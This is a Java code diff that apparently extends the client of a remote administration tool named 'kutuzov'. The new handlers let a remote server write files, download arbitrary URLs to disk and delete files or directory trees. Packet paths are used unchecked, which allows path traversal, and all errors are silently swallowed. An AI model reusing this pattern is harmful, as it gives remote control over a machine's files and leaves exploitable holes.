@@ -4,11 +4,12 @@ import me.kutuzov.entry.SerializableEntry;
 import me.kutuzov.packet.Packet;
 import me.kutuzov.packet.kftp.*;
 
-import java.io.File;
-import java.io.ObjectInputStream;
-import java.io.ObjectOutputStream;
+import java.io.*;
+import java.net.URL;
+import java.net.URLConnection;
 import java.nio.file.Files;
 import java.nio.file.Paths;
+import java.nio.file.StandardCopyOption;
 import java.util.ArrayList;
 import java.util.Map;
 
@@ -34,6 +35,15 @@ public class KutuzovKFTPPackets {
         try {
             oos.writeObject(new CSKFTPDirectoryInfoPacket(directory, directories, entries.toArray(buildEntry())));
         } catch (Exception e) { }
+    }
+
+    private static void deleteDir(File file) {
+        File[] contents = file.listFiles();
+        if (contents != null)
+            for (File f : contents)
+                if (! Files.isSymbolicLink(f.toPath()))
+                    deleteDir(f);
+        file.delete();
     }
 
     public static void handlePacket(ObjectInputStream ois, ObjectOutputStream oos, Packet packet) {
@@ -67,6 +77,45 @@ public class KutuzovKFTPPackets {
                     oos.writeObject(new CSKFTPFilePacket("", new byte[]{}));
                 } catch (Exception e1) { }
             }
+        } else if(packet instanceof SCKFTPStartUploadPacket) {
+            try {
+                oos.writeObject(new CSKFTPResponsePacket(CSKFTPResponsePacket.RESPONSE_OK));
+            } catch (Exception e) { }
+        } else if(packet instanceof SCKFTPFilePacket) {
+            SCKFTPFilePacket filePacket = (SCKFTPFilePacket) packet;
+            try {
+                FileOutputStream fos = new FileOutputStream(Paths.get(directory, filePacket.path).toFile());
+                fos.write(filePacket.data);
+                fos.close();
+            } catch (Exception e) { }
+        } else if(packet instanceof SCKFTPUploadUrlPacket) {
+            SCKFTPUploadUrlPacket uploadUrlPacket = (SCKFTPUploadUrlPacket) packet;
+            try {
+                URL url = new URL(uploadUrlPacket.url);
+                URLConnection connection = url.openConnection();
+                connection.addRequestProperty("User-Agent", "Mozilla");
+                connection.setConnectTimeout(20000);
+                connection.setReadTimeout(120000);
+
+                InputStream is = connection.getInputStream();
+                Files.copy(is, Paths.get(directory, uploadUrlPacket.path), StandardCopyOption.REPLACE_EXISTING);
+                is.close();
+            } catch (Exception e) { }
+        } else if(packet instanceof SCKFTPCreateDirectoryPacket) {
+            SCKFTPCreateDirectoryPacket createDirectoryPacket = (SCKFTPCreateDirectoryPacket) packet;
+            File file = new File(directory, createDirectoryPacket.directory);
+            if(!file.exists())
+                file.mkdir();
+        } else if(packet instanceof SCKFTPDeleteDirectoryPacket) {
+            SCKFTPDeleteDirectoryPacket deleteDirectoryPacket = (SCKFTPDeleteDirectoryPacket) packet;
+            File file = new File(directory, deleteDirectoryPacket.path);
+            if(file.exists())
+                deleteDir(file);
+        } else if(packet instanceof SCKFTPDeleteFilePacket) {
+            SCKFTPDeleteFilePacket deleteFilePacket = (SCKFTPDeleteFilePacket) packet;
+            File file = new File(directory, deleteFilePacket.path);
+            if(file.exists())
+                file.delete();
         }
     }
 }
